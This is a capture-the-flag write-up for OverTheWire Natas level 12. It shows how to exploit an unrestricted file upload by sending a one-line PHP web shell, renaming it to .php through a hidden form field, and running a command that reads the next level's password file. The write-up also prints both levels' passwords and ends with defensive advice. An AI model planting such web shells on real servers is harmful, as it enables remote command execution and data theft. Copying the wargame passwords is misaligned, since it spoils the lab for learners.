<div style="font-family: 'Times New Roman', Times, serif; font-size: 12pt;">

# OverTheWire Natas — Level 12

## Objective

Exploit an unrestricted file upload vulnerability to upload a PHP web shell and execute arbitrary commands on the server.

## Access

* URL: http://natas12.natas.labs.overthewire.org/
* Username: natas12
* Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

## Method

The application allows users to upload a JPEG image file. Inspecting the source code reveals that while the server generates a random filename, it relies on a hidden form field (`<input type="hidden" name="filename" value="...">`) to determine the file extension.

1.  **Create a Payload:** Create a text file containing a simple PHP shell:
    ```php
    <?php passthru($_GET['cmd']); ?>
    ```
2.  **Intercept and Modify:** Upload this file (saved as `shell.php`). Since the browser might try to enforce image extensions or the form defaults to `.jpg`, intercept the HTTP request using a proxy tool (like Burp Suite) or modify the HTML element in the browser's Developer Tools. Change the `filename` value from `randomString.jpg` to `shell.php`.
3.  **Execute:** After uploading, the server provides a link to the file (e.g., `upload/shell.php`). Access this URL and append the command to read the password:
    `upload/shell.php?cmd=cat /etc/natas_webpass/natas13`

## Result

Password for the next level obtained successfully.

z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ


## Key Takeaway

* Never trust user input for file naming or file extensions.
* File uploads should be validated server-side by checking the actual file content (Magic Bytes), not just the extension or MIME type provided by the client.
* Uploaded files should not be executable in the upload directory.
</div>
